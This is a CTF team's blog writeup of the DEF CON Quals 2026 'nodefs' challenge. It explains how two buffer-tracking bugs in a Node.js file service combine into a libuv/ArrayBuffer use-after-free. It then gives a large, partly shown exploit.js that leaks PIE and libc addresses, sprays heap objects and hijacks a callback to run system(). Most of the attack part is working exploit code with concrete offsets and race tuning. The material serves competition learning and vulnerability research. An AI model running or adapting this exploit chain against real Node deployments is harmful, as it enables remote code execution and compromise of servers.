---
title: "16th Place at DEF CON Quals 2026"
description: "We managed to get 16th place at DEF CON Quals 2026! Making us the 2nd best european team."
pubDate: "June 14 2026"
heroImage: "/blog/defcon_quals26/scoreboard.png"
author: "Popax21, Cherry, KuK"
---

We’re pleased to share that our team managed to achieve 16th place at DEF CON Quals 2026.\
Even though this made use the 2nd best european team we, sadly missed out on qualifing for Finals by 1 challenge.
Nevertheless, we want to share some writeups of the challenges we solved:
+ [Nodefs](#nodefs)
+ [Shelldiet](#shelldiet)

# nodefs

Author: Popax21\
Category: pwn, web

Description:
> An online file storage service for y'all bird enthusiasts to store bird pics. 
> It's just like NFS but with a bit more JavaScript.

## Challenge

"File host" webservice with the capability of creating/editing/manipulating files on a virtual FS.
Notably, it also has the capability to "transform" files through one of various types of transformation (consumes one file, produces another).

Backend exposes a WebSocket + ProtoBuf API with two distinct capability sets:
1. file manipulation
    - global ops: open/unlink/stat/...
    - per-file ops: read/write/seek/... (backed by a FD table)
    - read/write don't go through the user, but read/write to a buffer (see below)
2. buffer manipulation:
    - allocate/free/resize buffers (backed by a BD table)
    - bread/bwrite: read back buffer contents / write user data into buffer
    - "special ops":
        - bscatter: replace dst BD entry with slice of src buffer
        - bgather: replace dst BD entry with one of multiple source buffers based on "selector byte" stored within selector BD
        - btransform: transform buffer contents using one of multiple ops (work done in background worker)
    - bscatter / bgather aren't instant operations, they redefine the BD to be a lazy "buffer route"
        - modifying a src buffer modifies the view dst buffer route!
        - internal tracking of which buffers have pending in-flight ops / have been recently modified / etc.
    - btransform "stages" the given BD
        - ensures the entire buffer route is stable / has no pending ops before dispatching the op
    
## Vulnerability

Two combining bugs (both initially discovered by autonomous agents, subsequently confirmed / validated by human overseers):

### `bscatter` view tracking is borked

- `BufferTable.resolve` returns a `ResolvedExtent`, containing a view of the buffer + lockout / in-flight op tracking
- `ResolvedExtent.commit` is supposed to point to the buffer whose data will be modified by e.g. a `BufferTable.write` op
- `BufferTable.write` will bump `ResolvedExtent.commit.version` to mark the source buffer as dirty

HOWEVER: `ScatterEntry`s are broken!
 - corresponding `resolve` snippet: `{ ...resolved, buf: resolved.buf.subarray(start, end), commit: undefined }`
 - `commit` is explicitly zeroed out!
 - `Buffer.subarray()`: "Modifying the new Buffer slice will modify the memory in the original Buffer because the allocated memory of the two objects overlap."
 
-> writing to a buffer using a `bscatter` view will not bump `Extent.version`!

PS: why is `commit` even a thing - just bump `ResolvedExtent.extent.version` directly `\_(ツ)_/`

### `bgather` route resolution is really weird

- before a `btransform` operation can commence, `BufferTable.stage` calls `BufferTable.routeReady`
- intent: check that the route is "stable", i.e. no in-flight ops are pending that could change the route while transform is pending
- for `GatherEntry`s:
    - check via `BufferTable.foldedGatherSource` if the source BD entry can be nailed down exactly
    - if so, recursively check just that source BD
    - otherwise: recurseively check that both the selector BD + all possible source BDs are ready
- `foldedGatherSource()` checks whether:
    1. all possible source BD entries are the same (`BufferTable.sameSource`)
    2. the selector BD byte has no in-flight ops, and has not been modified since the the gather entry was created

-> nothing is explicitly broken, it's just really really weird
- why bother with the version / etc. checks???
- why not just resolve `BufferTable.selectorValue` immediately???

In combination with the first bug: BREAKAGE!
- `bscatter` bug allows us to modify the selector byte without bumping `lease.version`
- subsequently start a `btransform` op on a `bgather` route
- `routeReady` checks for inflight ops on any part of the buffer route
- `foldedGatherSource` sees `lease.version` of the selector matching the old version -> short circuits
- only one of the source bufs (and cruicially NOT the currently active source buf) is checked for inflight ops
- `routeReady` passes -> `resolve` uses the current selector byte value -> returns a BD entry not checked by `routeReady` before

---

END RESULT: ability to start a `btransform` op on an `ArrayBuffer` that has an in-flight e.g. FS op!
- `btransform` sends the buffer to the worker -> DETACHES THE `BackingStore` FROM `ArrayBuffer`!
- Node's `FSReqPromise` keeps the `JSArrayBuffer` object alive, but not the AB's `BackingStore`!
- libuv references the `BackingStore` using a raw pointer -> no V8 GC reference!

-> a V8 GC can reclaim the AB BS while libuv still holds a pointer into it
-> **race window leading to UaF!!!**

## Exploitation

TLDR of vuln: we can detach an `ArrayBuffer`'s backing store (by sending the AB to a different worker) while a Node `FileHandle` has a pending operation targeting this backing store

NodeJS's ABA (`ArrayBufferAllocator`) wraps malloc / free directly (only possible because no V8 SBX) -> this is musl mallocng pwn, not V8 pwn

Outline of race window:
1. start a pending NodeJS / libuv FS op
2. send the AB to a different thread (detaching the backing store from the main thread's AB object)
3. make the worker's received AB become dangling
4. trigger a V8 GC to invoke the `ArrayBufferSweeper` to free the backing store
5. reclaim the BS's memory allocation with some victim object
6. the pending libuv operation finally executes; instead of operating on the AB BS, it now corrupts our victim object

... yeeeaaaa, hitting this race even just once for the first time was a giant PITA (took ~20h until the first SIGSEGV) .-.

NOTE: we can enlargen the race window by abusing libuv's thread pool:
- libuv has a work queue (mostly FIFO semantics) + associated thread pool for FS ops
- we can spam the work queue with garbage ops to delay the processing of our race FS op!
- issue: we must not await a libuv workqueue op while within the race window (otherwise we must wait for the queue to drain)
  - this stumped me for a long time, because turns out that by default WS per-message (de)compression goes through libuv :p
  - fixed by `new WebSocket(..., { perMessageDeflate: false })`

Additionally, the current race route has some other issues:
- triggering a V8 GC on a worker thread is really tedious (dumb heuristics)
- mallocng has some weird per-thread caching that make UaF reclamation difficult

However, we can tweak the route to make exploitation easier for us:
- invoke `btransform` with a garbage op
- the AB is sent to the worker, but immediately sent back
    - bonus: doesn't go through a transform that would await a libuv work queue item
- the main thread invokes `BufferTable.restore` -> re-roots the newly received AB
- send two `resume` messages in short succession (same TCP packet using `ws._socket.[un]cork()`):
    - `resume` calls `await fdTable.closeAll()`, then `bufferTable.closeAll()`
    - first `resume`: `FileDescriptorTable.closeAll()` clears `this.fds`, then gets stuck waiting for all `FileHandle`s to close (blocks on the clogged libuv work queue)
    - second `resume`: `FileDescriptorTable.closeAll()` is a no-op because `this.fds` has been cleared, invokes `BufferTable.closeAll()` -> removes the reference to our newly received AB!
    - there's no per-WS connection lockout/mutex that prevents this
    - same TCP packet -> the clear happens in one microtask queue churn, doesn't make our race tighter
- triggering a GC from the main thread is easy by spamming `balloc` operations

Final missing piece: what victim object do we target? -> `FSReqPromise` / `uv_fs_t` objects (mallocng class 18)
- PIE leaks from e.g. vtable pointers
- RIP control when corrupting `req_.cb`
    - first arg control as well -> free `system(...)` invocation
    - need to ensure our `uv_fs_t` objects are queued after the UaF corruption op so that the corrupted CB is invoked
    - in practice: just have some background connections spamming `rename` ops all day and retry a bunch

Final chain:
1. PIE LEAK: race a `FileHandle.write` op
    - writes UaF object to a file -> leaks a `FSReqPromise` object
    - contains PIE leaks through the vtable / `syscall_` pointers
2. LIBC LEAK: race a `FileHandle.read` op targeting the `syscall_` member
    - reads controlled data into the UaF object -> corrupts the victim object
    - overwrites `syscall_` with the address of a PIE GOT entry
    - error message of the corrupted rename op leaks the GOT entry
        - uses `OneByteString`, so no invalid UTF-8 sequence information loss
    - GOT entry points at libc function -> libc leak!
3. POP FLAG: race a `FileHandle.read` op targeting the entire `uv_fs_t req_` member
    - overwrite start of struct with `/readflag > /nfs/storage/.../flag.out` string
    - overwrite `req_.cb` to point to system
    - `req_.loop->active_reqs.count` needs to be valid and >= 1 (otherwise SIGSEGV / `abort()`)
    - be careful to leave `req_.fs_type` intact (otherwise libuv `abort()`s because of a switch-case `default:`)
    - once corrupted `uv_fs_t` is processed:
        1. the op errors (we don't care)
        2. `req_.cb(req)`
        3. `system("/readflag > /nfs/storage/.../flag.out")`
        4. flag gets placed in file accessible by user!
4. READ FLAG: just read the `/flag.out` file once it appears to get a flag :)

*exploit.js*

<details>

```js

#!/usr/bin/env node
// nodefs exploit chain. Node v24.14.1 / libuv FSReqPromise BackingStore UAF.
//
// Underlying primitive (shared by all stages): a TOCTOU in the gather path
// frees bdB's BackingStore while libuv has captured its data pointer for an
// in-flight uv_fs op. A rename sprayer reclaims the freed slot with a fresh
// FSReqPromise<AliasedFloat64Array> (same size class). libuv then performs
// its op against the dangling pointer — i.e. against the FSReqPromise.
//
// Direction of the op selects the primitive:
//   uv_fs_write → writeback. The kernel READS bytes from the reclaimed slot
//                  and writes them to /leak_<pid>_<idx>. Used by Stage 1: we
//                  read the file back and parse PIE pointers directly.
//   uv_fs_read  → predicate-write. The kernel WRITES /victim bytes INTO the
//                  reclaimed slot, corrupting chosen FSReqPromise fields:
//                    slot+560 syscall_  (Stage 2: redirect to GOT for libc leak)
//                    slot+188 req_.cb   (Stage 3: redirect to system())
//
// Stages:
//   1.  writeback PIE leak → PIE_base
//   2.  syscall_-redirect libc leak (read execve@GOT) → libc_base
//   3.  req_.cb hijack → system(cmd); cmd planted in same pred (rdi=req)
//   4.  exfil flag.out via nfs read (in parallel with Stage 3 race)
//
// See LEAK_NOTES.md for the full per-field rationale.

'use strict';
const WebSocket = require('ws');
const protobuf  = require('protobufjs');
const http      = require('http');
const https     = require('https');
const crypto    = require('crypto');

// ---------------------------------------------------------------------------
// Target / config
// ---------------------------------------------------------------------------

function parseTarget() {
  const t = process.env.TARGET;
  if (t) {
    const u = new URL(t);
    const secure = u.protocol === 'https:' || u.protocol === 'wss:';
    return { host: u.hostname, port: u.port ? parseInt(u.port) : (secure ? 443 : 80), explicitPort: !!u.port, secure };
  }
  return { host: process.env.HOST || '127.0.0.1', port: parseInt(process.env.PORT || '1337'), explicitPort: true, secure: false };
}
const TARGET = parseTarget();
const HOST = TARGET.host, PORT = TARGET.port, SECURE = TARGET.secure;
const HTTP_LIB = SECURE ? https : http;
const URL_AUTHORITY = TARGET.explicitPort ? `${HOST}:${PORT}` : HOST;
const HTTP_URL = `${SECURE ? 'https' : 'http'}://${URL_AUTHORITY}`;
const WS_URL   = `${SECURE ? 'wss'   : 'ws'  }://${URL_AUTHORITY}`;

// Class-18 sizing: 796-byte BackingStore + 792-byte FSReqPromise both land
// in class 18 at slot+0 (slack=0 for both).
const BD_SIZE = 796;

// FSReqPromise field offsets (post -8 shift relative to the original handoff;
// confirmed empirically by the Stage 1 writeback dump):
//   slot+0   FSReqPromise<AliasedFloat64Array> vtable_ptr (unused leak anchor)
//   slot+104 uv_fs_t req_
//   slot+184 uv_fs_t.cb  (target of Stage 3 hijack)
//   slot+560 FSReqBase::syscall_ → "rename" in .rodata (target of Stage 2 redirect)
//   slot+600 buf_st_[0]
//   slot+672 stats_field_array_.vtable (AliasedBufferBase, Stage 1 anchor)
const SLOT_OFF_SYSCALL   = 560;
const SLOT_OFF_VTABLE672 = 672;

// === Binary offsets (PIE-relative; verified via objdump on /chall/node) ===
const VTABLE_BIN_OFFSET     = 0x068B3298n;  // AliasedBufferBase<double,Float64Array> vtable (sym+16)
const SYSCALL_BIN_OFFSET    = 0x03C1DB3Cn;  // .rodata "rename" — second writeback anchor
const EXECVE_GOT_BIN_OFFSET = 0x069EE190n;  // execve@GOT (target of Stage 2 redirect)

// === Musl libc offsets (Alpine 3.23, `nm -D /lib/ld-musl-x86_64.so.1`) ===
const MUSL_EXECVE_OFFSET = 0x05BBD2n;
const MUSL_SYSTEM_OFFSET = 0x05C456n;

// Stage 2 (libc leak) pred config — overwrite syscall_ with execve@GOT addr.
const SYSCALL_PRED_OFFSET = parseInt(process.env.SYSCALL_PRED_OFFSET || '560');
const SYSCALL_LEAK_LENGTH = parseInt(process.env.SYSCALL_LEAK_LENGTH || '8');

// Stage 3 (RCE via req->cb hijack) pred config.
//   pred at slot+104, length 88: writes /victim[0..87] into slot+104..191.
//   /victim[80..87] overwrites cb at slot+184. Bytes 0..79 carry the shell cmd
//   starting at rdi = req = slot+104. /victim[72..79] sets req->loop to a safe
//   non-NULL .data pointer so uv__fs_done's preamble (`mov 0x20(%rdx), %eax`)
//   doesn't fault before transferring control to %rax = cb = system.
const RCE_PRED_OFFSET     = parseInt(process.env.RCE_PRED_OFFSET     || '104');
const RCE_LEAK_LENGTH     = parseInt(process.env.RCE_LEAK_LENGTH     || '88');
const RCE_CB_VICTIM_BYTE  = parseInt(process.env.RCE_CB_VICTIM_BYTE  || '80');

// Sprayer mode. Default 'idle' = no parsing; sprayer just keeps reclaiming
// freed slots with fresh FSReqPromise instances.
let STAGE_KIND = 'idle';

// Diagnostic counters & samples for the libc-stage sprayer.
const libcDbg = { total: 0, corrupted: 0, samples: [] };

// Support pools. Tuned to maximize per-second reclaim attempts without saturating
// any single pool.
const SAT_BROTLI_CONNS = parseInt(process.env.SAT_BROTLI_CONNS || '10');
const SAT_BROTLI_PAR   = parseInt(process.env.SAT_BROTLI_PAR   || '5');
const SAT_BROTLI_PAD   = parseInt(process.env.SAT_BROTLI_PAD   || (512 * 1024));
const SPRAY_CONNS      = parseInt(process.env.SPRAY_CONNS      || '16');
const RENAMES_PER_BATCH= parseInt(process.env.RENAMES_PER_BATCH || '16');

const BURST_CONNS    = parseInt(process.env.BURST_CONNS    || '24');
const BURST_PER_CONN = parseInt(process.env.BURST_PER_CONN || '15');
const BURST_SIZE     = parseInt(process.env.BURST_SIZE     || '524288');

// LOW_RATE=1 forces the conservative "TLS / strict ingress" timing on any
// target — useful for smoke-testing the constrained code paths locally
// without standing up an actual TLS endpoint. Auto-on whenever the URL is
// https / wss. Combines: serial race rounds (no token eviction), longer
// HOLD_MS (slower op completion), and KICK_DELAY_MS (ensure brotli kick
// hits the server ahead of the race batch).
const LOW_RATE = process.env.LOW_RATE === '1' || SECURE;

const RACE_PARALLEL    = parseInt(process.env.RACE_PARALLEL    || (LOW_RATE ? '1' : '8'));
const ROUNDS_PER_STAGE = parseInt(process.env.ROUNDS_PER_STAGE || '400');
const HOLD_MS          = parseInt(process.env.HOLD_MS          || (LOW_RATE ? '12000' : '8000'));
const WARMUP_MS        = parseInt(process.env.WARMUP_MS        || '10000');
const KICK_DELAY_MS    = parseInt(process.env.KICK_DELAY_MS    || (LOW_RATE ? '80' : '0'));

const STALL_CONNS         = parseInt(process.env.STALL_CONNS         || '8');
const STALL_PADS_PER_CONN = parseInt(process.env.STALL_PADS_PER_CONN || '12');
const STALL_KICK          = parseInt(process.env.STALL_KICK          || '12');
const STALL_PAD_SIZE      = parseInt(process.env.STALL_PAD_SIZE      || (512 * 1024));

const O_RDONLY = 0, O_WRONLY = 1, O_CREAT = 4, O_TRUNC = 8;

let Request, ServerMessage;
let running = true;
let SHARED_TOKEN = null;
let STORAGE_ROOT = null;
let stageLeaks = [];

// ---------------------------------------------------------------------------
// Plumbing — proto, WS, ack/sig demux
// ---------------------------------------------------------------------------

function fetchProto() {
  return new Promise((resolve, reject) => {
    HTTP_LIB.get(`${HTTP_URL}/nfs.proto`, (res) => {
      if (res.statusCode !== 200) { res.resume(); return reject(new Error(`proto fetch HTTP ${res.statusCode}`)); }
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end',  () => resolve(Buffer.concat(chunks).toString('utf8')));
      res.on('error', reject);
    }).on('error', reject);
  });
}

class Nfs {
  constructor(ws) {
    this.ws = ws; this.id = 1;
    this.acks = new Map(); this.sigs = new Map();
    this.dead = false;
    ws.binaryType = 'arraybuffer';
    ws.on('message', (raw) => {
      let m; try { m = ServerMessage.decode(new Uint8Array(raw)); } catch { return; }
      if (m.response) {
        for (const s of (m.response.subAcks || [])) {
          const p = this.acks.get(s.id);
          if (p) { this.acks.delete(s.id); p.resolve(s.rd); }
        }
        const p = this.acks.get(m.response.id);
        if (p) { this.acks.delete(m.response.id); p.resolve(m.response.rd); }
      }
      if (m.signal) {
        const p = this.sigs.get(m.signal.rd);
        if (p) {
          this.sigs.delete(m.signal.rd);
          if (m.signal.ok) p.resolve(m.signal);
          else             p.reject(new Error(m.signal.error || 'op failed'));
        }
      }
    });
    ws.on('close', () => { this.dead = true; this._failAll('disconnected'); });
    ws.on('error', () => { this.dead = true; this._failAll('socket error'); });
  }
  _failAll(why) {
    for (const p of this.acks.values()) p.reject(new Error(why));
    for (const p of this.sigs.values()) p.reject(new Error(why));
    this.acks.clear(); this.sigs.clear();
  }
  _send(payload) {
    if (this.dead) throw new Error('disconnected');
    const err = Request.verify(payload);
    if (err) throw new Error('verify: ' + err);
    this.ws.send(Request.encode(Request.create(payload)).finish());
  }
  sys(opField, opData) {
    const id = this.id++;
    let sigRes, sigRej;
    const sigP = new Promise((res, rej) => { sigRes = res; sigRej = rej; });
    this.acks.set(id, { resolve: (rd) => { this.sigs.set(rd, { resolve: sigRes, reject: sigRej }); }, reject: sigRej });
    this._send({ id, [opField]: opData, wantSignal: true });
    return sigP;
  }
  sysAck(opField, opData) {
    const id = this.id++;
    const ackP = new Promise((res, rej) => this.acks.set(id, { resolve: res, reject: rej }));
    this._send({ id, [opField]: opData, wantSignal: false });
    return ackP;
  }
  sendBatchMixed(ops) {
    const subs = ops.map(op => ({ id: this.id++, opField: op.opField, opData: op.opData, wantSignal: !!op.wantSignal }));
    const sigs = subs.map(s => {
      if (!s.wantSignal) return null;
      let sigRes, sigRej;
      const sigP = new Promise((res, rej) => { sigRes = res; sigRej = rej; });
      this.acks.set(s.id, { resolve: (rd) => { this.sigs.set(rd, { resolve: sigRes, reject: sigRej }); }, reject: sigRej });
      return sigP;
    });
    this._send({ id: this.id++, wantSignal: false,
      batch: { requests: subs.map(s => ({ id: s.id, [s.opField]: s.opData, wantSignal: s.wantSignal })) } });
    return sigs;
  }
  close() { try { this.ws.close(); } catch {} }
  corked(fn) { const s = this.ws._socket; s.cork(); try { return fn(); } finally { s.uncork(); } }
}

async function connect() {
  const ws = new WebSocket(WS_URL, { perMessageDeflate: false });
  await new Promise((res, rej) => { ws.once('open', res); ws.once('error', rej); });
  return new Nfs(ws);
}

async function newSession() {
  const c = await connect();
  if (SHARED_TOKEN) await c.sys('resume', { token: SHARED_TOKEN });
  else {
    const u = `pwn_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`;
    SHARED_TOKEN = (await c.sys('register', { username: u, password: 'pwnpwnpwn' })).authResult.token;
  }
  return c;
}

async function learnStorageRoot(c) {
  const probePath = '/probe-for-storage-root';
  try { await c.sys('stat', { path: probePath }); }
  catch (e) {
    const m = /stat '([^']*)'/.exec(e.message);
    if (!m) throw new Error(`unexpected stat error: ${e.message}`);
    STORAGE_ROOT = m[1].slice(0, m[1].length - probePath.length);
  }
}

async function primeVictim(victimBytes) {
  const c = await newSession();
  try {
    if (!STORAGE_ROOT) await learnStorageRoot(c);
    // open + balloc (independent). 1 RTT.
    const [openRes, ballocRes] = await Promise.all(c.sendBatchMixed([
      { opField: 'open',   opData: { path: '/victim', flags: O_WRONLY | O_CREAT | O_TRUNC }, wantSignal: true },
      { opField: 'balloc', opData: { size: victimBytes.length },                              wantSignal: true },
    ]));
    const fd  = Number(openRes.retval);
    const wbd = Number(ballocRes.retval);
    // bwrite + ftruncate + write — write needs ftruncate, all need bwrite done.
    // 1 RTT (server processes batch sequentially).
    await Promise.all(c.sendBatchMixed([
      { opField: 'bwrite',    opData: { bd: wbd, offset: 0, data: victimBytes },                  wantSignal: true },
      { opField: 'ftruncate', opData: { fd, length: victimBytes.length },                         wantSignal: true },
      { opField: 'write',     opData: { fd, bd: wbd, bufOffset: 0, length: victimBytes.length },  wantSignal: true },
    ]));
    // close + bfree must come AFTER write's sig (else EBUSY: fd in use by worker).
    await Promise.all(c.sendBatchMixed([
      { opField: 'close', opData: { fd },          wantSignal: true },
      { opField: 'bfree', opData: { bd: wbd },     wantSignal: true },
    ]));
  } finally { c.close(); }
}

// ---------------------------------------------------------------------------
// Support pools — saturator, sprayer, burst, stall
// ---------------------------------------------------------------------------

async function brotliBlocker() {
  while (running) {
    let c;
    try {
      c = await newSession();
      // Allocate all pads in one RTT.
      const ballocSigs = await Promise.all(c.sendBatchMixed(
        Array.from({ length: SAT_BROTLI_PAR }, () => ({
          opField: 'balloc', opData: { size: SAT_BROTLI_PAD }, wantSignal: true,
        }))
      ));
      const pads = ballocSigs.map(s => Number(s.retval));
      // Fill each pad with random content in one batched RTT per pad.
      const chunk = crypto.randomBytes(Math.min(SAT_BROTLI_PAD, 128 * 1024));
      await Promise.all(pads.map(pad => {
        const ops = [];
        for (let off = 0; off < SAT_BROTLI_PAD; off += chunk.length) {
          ops.push({ opField: 'bwrite', opData: { bd: pad, offset: off, data: chunk }, wantSignal: true });
        }
        return Promise.all(c.sendBatchMixed(ops));
      }));
      const fire = (pad) => {
        if (!running || c.dead) return;
        c.sys('btransform', { bd: pad, op: 'brotli:compress' }).then(() => fire(pad), () => fire(pad));
      };
      for (const pad of pads) fire(pad);
      await new Promise(res => { const tick = () => (!running || c.dead) ? res() : setTimeout(tick, 200); tick(); });
    } catch {}
    finally { try { c?.close(); } catch {} }
    if (running) await new Promise(r => setTimeout(r, 100));
  }
}

let renameSeed = 0;
function renameBatchOps() {
  const ops = [];
  for (let i = 0; i < RENAMES_PER_BATCH; i++) {
    const tag = (renameSeed++).toString(16).padStart(6, '0');
    const oldPath = `/r${tag}`;
    const newPath = `/q${tag}`;
    ops.push({ opField: 'rename', opData: { oldPath, newPath }, wantSignal: true });
  }
  return ops;
}

// Parse a rename error message for the libc stage. UVException builds:
//   "ENOENT: no such file or directory, <SYSCALL_BYTES> '<src>' -> '<dest>'"
// Normally <SYSCALL_BYTES> is "rename" (the static syscall_ pointer). When
// pred has corrupted syscall_ to point at the GOT entry, OneByteString reads
// strlen-many bytes from there and substitutes them at the SYSCALL position.
// We anchor on " '" + STORAGE_ROOT to locate the start of <src> (avoids
// false matches when the leaked bytes contain ' or " '").
function parseLibcSyscallBytes(msg) {
  const PREFIX = 'ENOENT: no such file or directory, ';
  if (!msg.startsWith(PREFIX)) return null;
  const anchor = " '" + STORAGE_ROOT;
  const anchorIdx = msg.indexOf(anchor, PREFIX.length);
  if (anchorIdx < 0) return null;
  const syscallStr = msg.slice(PREFIX.length, anchorIdx);
  if (syscallStr === 'rename') return null;  // syscall_ uncorrupted
  // Each JS string char maps to a memory byte:
  //   - codepoint < 0x100   : 1 byte (Latin-1 via NewFromOneByte)
  //   - codepoint >= 0x100  : shouldn't happen for OneByteString, but
  //                            re-encode defensively as UTF-8 bytes.
  const bytes = [];
  for (const ch of syscallStr) {
    const cp = ch.codePointAt(0);
    if (cp < 0x100) {
      bytes.push(cp);
    } else if (cp <= 0x7FF) {
      bytes.push(0xC0 | (cp >> 6));
      bytes.push(0x80 | (cp & 0x3F));
    } else if (cp <= 0xFFFF) {
      bytes.push(0xE0 | (cp >> 12));
      bytes.push(0x80 | ((cp >> 6) & 0x3F));
      bytes.push(0x80 | (cp & 0x3F));
    } else {
      bytes.push(0xF0 | (cp >> 18));
      bytes.push(0x80 | ((cp >> 12) & 0x3F));
      bytes.push(0x80 | ((cp >> 6) & 0x3F));
      bytes.push(0x80 | (cp & 0x3F));
    }
  }
  return bytes;
}

async function sprayer() {
  while (running) {
    let c;
    try {
      c = await newSession();
      while (running && !c.dead) {
        const ops = renameBatchOps();
        let sigs;
        try { sigs = c.sendBatchMixed(ops); } catch { break; }
        const results = await Promise.allSettled(sigs.filter(Boolean));
        for (let k = 0; k < results.length; k++) {
          const r = results[k];
          if (r.status !== 'rejected') continue;
          const msg = r.reason && r.reason.message || '';
          // Only Stage 2 (libc) parses the rename error stream — to capture
          // the leaked syscall_ bytes. All other stages (idle / writeback /
          // rce) just need the sprayer to keep reclaiming slots and discard
          // the rename errors silently.
          if (STAGE_KIND !== 'libc') continue;
          const PREFIX = 'ENOENT: no such file or directory, ';
          if (!msg.startsWith(PREFIX)) continue;
          const anchor = " '" + STORAGE_ROOT;
          const idx = msg.indexOf(anchor, PREFIX.length);
          if (idx <= 0) continue;
          const sc = msg.slice(PREFIX.length, idx);
          libcDbg.total++;
          if (sc === 'rename') continue;  // not corrupted
          libcDbg.corrupted++;
          if (libcDbg.samples.length < 5) libcDbg.samples.push(sc);
          const bytes = parseLibcSyscallBytes(msg);
          if (bytes) stageLeaks.push(JSON.stringify(bytes));
        }
      }
    } catch {}
    finally { try { c?.close(); } catch {} }
    if (running) await new Promise(r => setTimeout(r, 50));
  }
}

const burstPool = [];
async function setupBurst() {
  await Promise.all(Array.from({ length: BURST_CONNS }, async () => {
    try {
      const c = await newSession();
      const seed = Number((await c.sys('balloc', { size: 16 })).retval);
      burstPool.push({ c, bds: [seed] });
    } catch {}
  }));
}
async function fireBurst() {
  await Promise.all(burstPool.map(async (slot) => {
    if (slot.c.dead) return;
    if (slot.bds.length) {
      const prior = slot.bds;
      slot.bds = [];
      await Promise.all(prior.map(bd => slot.c.sys('bfree', { bd }).catch(() => {})));
    }
    const results = await Promise.allSettled(
      Array.from({ length: BURST_PER_CONN }, () => slot.c.sys('balloc', { size: BURST_SIZE })));
    for (const r of results) if (r.status === 'fulfilled') slot.bds.push(Number(r.value.retval));
  }));
}

const stallPool = [];
let stallCursor = 0;
async function setupStall() {
  await Promise.all(Array.from({ length: STALL_CONNS }, async () => {
    let c;
    try {
      c = await newSession();
      // Batch allocate all pads in one RTT.
      const ballocSigs = await Promise.all(c.sendBatchMixed(
        Array.from({ length: STALL_PADS_PER_CONN }, () => ({
          opField: 'balloc', opData: { size: STALL_PAD_SIZE }, wantSignal: true,
        }))
      ));
      const pads = ballocSigs.map(s => Number(s.retval));
      // Fill each pad with random content (write in 128KB chunks in parallel).
      const chunk = crypto.randomBytes(Math.min(STALL_PAD_SIZE, 128 * 1024));
      await Promise.all(pads.map(bd => {
        const ops = [];
        for (let off = 0; off < STALL_PAD_SIZE; off += chunk.length) {
          ops.push({ opField: 'bwrite', opData: { bd, offset: off, data: chunk }, wantSignal: true });
        }
        return Promise.all(c.sendBatchMixed(ops));
      }));
      stallPool.push({ c, pads });
    } catch { try { c?.close(); } catch {} }
  }));
}
function kickStall() {
  const slot = stallPool[(stallCursor++) % stallPool.length];
  if (!slot || slot.c.dead) return;
  for (let i = 0; i < STALL_KICK && i < slot.pads.length; i++) {
    slot.c.sysAck('btransform', { bd: slot.pads[i], op: 'brotli:compress' }).catch(() => {});
  }
}

// ---------------------------------------------------------------------------
// Race round (read-direction): pred-WRITE bytes from /victim into the freed
// slot at offset `predOffset`. After reclaim, the same offset hits
// FSReqPromise+predOffset. Used by Stage 2 (slot+560 syscall_ overwrite) and
// Stage 3 (slot+104 bulk cmd+loop+cb overwrite). Stage 1 uses the inverted
// direction — see raceRoundWrite below.
// ---------------------------------------------------------------------------
async function raceRound(predOffset, predLength) {
  let c;
  try { c = await newSession(); } catch { return { ok: false }; }
  try {
    // Batch 1 — allocs + open /victim. 1 RTT.
    const [s0, s1, s2, s3] = await Promise.all(c.sendBatchMixed([
      { opField: 'balloc', opData: { size: 8       },                                wantSignal: true },
      { opField: 'balloc', opData: { size: 4       },                                wantSignal: true },
      { opField: 'balloc', opData: { size: BD_SIZE },                                wantSignal: true },
      { opField: 'open',   opData: { path: '/victim', flags: O_RDONLY },             wantSignal: true },
    ]));
    const bdSel = Number(s0.retval);
    const bdA   = Number(s1.retval);
    const bdB   = Number(s2.retval);
    const fdR   = Number(s3.retval);

    // Batch 2 — bscatter + bgather + selector flip. The bwrite must COMPLETE
    // before the race batch fires (else btransform's PWN could detach bdA
    // instead of bdB). 1 RTT.
    const [sc, gg] = await Promise.all(c.sendBatchMixed([
      { opField: 'bscatter', opData: { bd: 0, sourceBd: bdSel, offset: 0, length: 1 },                        wantSignal: true },
      { opField: 'bgather',  opData: { bd: 0, sourceBds: [bdA, bdB], selectorBd: bdSel, selectorOffset: 0 },  wantSignal: true },
    ]));
    const bdSc = Number(sc.retval);
    const G    = Number(gg.retval);
    await c.sys('bwrite', { bd: bdSc, offset: 0, data: Buffer.from([1]) });

    // Kick stall before the race batch so the brotli ops arrive ahead of our
    // libuv read on the worker queue. On high-RTT links KICK_DELAY_MS ensures
    // the kick packets actually reach the server first.
    kickStall();
    if (KICK_DELAY_MS > 0) await new Promise(r => setTimeout(r, KICK_DELAY_MS));

    // Batch 3 — race [read, btransform]. 1 RTT.
    const sigs = c.sendBatchMixed([
      { opField: 'read',       opData: { fd: fdR, bd: bdB, bufOffset: predOffset, length: predLength }, wantSignal: false },
      { opField: 'btransform', opData: { bd: G, op: 'PWN' },                                            wantSignal: true  },
    ]);
    try { await sigs[1]; } catch {}
    c.corked(() => {
      c.sysAck('resume', { token: SHARED_TOKEN }).catch(() => {});
      c.sysAck('resume', { token: SHARED_TOKEN }).catch(() => {});
    });
    await new Promise(r => setImmediate(r));
    fireBurst().catch(() => {});
    return { ok: true };
  } catch { return { ok: false }; }
  finally { try { c.close(); } catch {} }
}

// runStage runs up to `rounds` race rounds with one pred config + payload.
// Returns all rename-error-channel leaks captured by the sprayer.
//
// opts.minVotes: if set, stop early once any single leak pattern reaches this
// many occurrences. The libc and (legacy) PIE leaks are deterministic per
// PIE_base — one repeated pattern is the truth. Stage 3 (control hijack)
// passes 0 / omits it and just runs the full batch (no "leak" expected).
async function runStage(label, predOffset, predLength, victimBytes, rounds, opts = {}) {
  const minVotes = opts.minVotes | 0;
  process.stdout.write(`[stage:${label}] predOffset=${predOffset} predLength=${predLength} victim=${victimBytes.toString('hex')}${minVotes ? ` minVotes=${minVotes}` : ''}\n`);
  await primeVictim(victimBytes);
  stageLeaks = [];
  let started = 0, finished = 0, stop = false;
  await new Promise((resolve) => {
    let active = 0;
    const tick = () => {
      if (stop && active === 0) { resolve(); return; }
      while (!stop && active < RACE_PARALLEL && started < rounds) {
        active++; started++;
        raceRound(predOffset, predLength).then(() => {
          finished++; active--;
          if (minVotes && !stop) {
            // Cheap pattern check: count occurrences of the most recent leak.
            // Stop as soon as ANY pattern crosses minVotes.
            const tail = stageLeaks[stageLeaks.length - 1];
            if (tail !== undefined) {
              let n = 0;
              for (let i = stageLeaks.length - 1; i >= 0; i--) if (stageLeaks[i] === tail) n++;
              if (n >= minVotes) {
                stop = true;
